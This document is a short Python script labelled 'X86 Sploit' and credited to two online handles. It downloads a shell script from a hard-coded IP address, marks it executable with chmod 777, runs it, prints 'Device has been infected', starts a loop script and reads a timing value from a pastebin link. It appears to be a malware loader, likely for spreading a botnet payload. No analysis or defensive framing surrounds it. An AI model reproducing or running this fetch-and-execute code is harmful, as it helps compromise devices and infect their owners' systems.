import urllib.request
import time
import requests
import os
from os import system

print("X86 Sploit Made by @0x16b X @Queered")
time.sleep(3)
print("Downloading & Uploading bins")
time.sleep(3)
urllib.request.urlretrieve("http://85.209.134.235/tndw.sh","tndw.sh")
time.sleep(3)
print("done downloading :)")
time.sleep(3)
print("ready to infect this hoe???")
print("infecting . . .")
time.sleep(3)
os.system("chmod 777 tndw.sh; sh tndw.sh")
print("Device has been infected")
print("Starting the loop")
os.system("python3 loop.py")
pastebin_raw_link = 'https://pastebin.com/raw/ZWzK047T'
response = requests.get(pastebin_raw_link)
skid = response.content
time.sleep(int(skid))
